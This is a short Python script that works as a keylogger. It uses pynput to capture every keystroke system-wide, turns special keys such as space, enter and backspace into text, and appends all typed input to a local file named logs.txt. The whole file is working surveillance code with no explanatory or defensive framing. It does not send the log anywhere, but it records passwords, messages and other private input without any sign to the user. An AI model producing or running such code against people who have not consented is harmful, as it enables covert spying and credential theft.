from pynput.keyboard import Listener

def writetofile(key):
    keydata = str(key)
    keydata = keydata.replace("'", "")

    # Handle specific key replacements
    if keydata == 'Key.space':
        keydata = ' '
    elif keydata == 'Key.shift':
        keydata = ''
    elif keydata == 'Key.ctrl_l':
        keydata = ''
    elif keydata == 'Key.enter':
        keydata = '\n'
    elif keydata == 'Key.backspace':
        # Handle backspace
        with open("logs.txt", 'r') as f:
            content = f.read()
        # Remove the last character if content is not empty
        content = content[:-1] if content else content
        with open("logs.txt", 'w') as f:
            f.write(content)
        return  # Exit after handling backspace

    # Log key press to file
    with open("logs.txt", 'a') as f:
        f.write(keydata)

# Listener to capture keystrokes
with Listener(on_press=writetofile) as l:
    l.join()
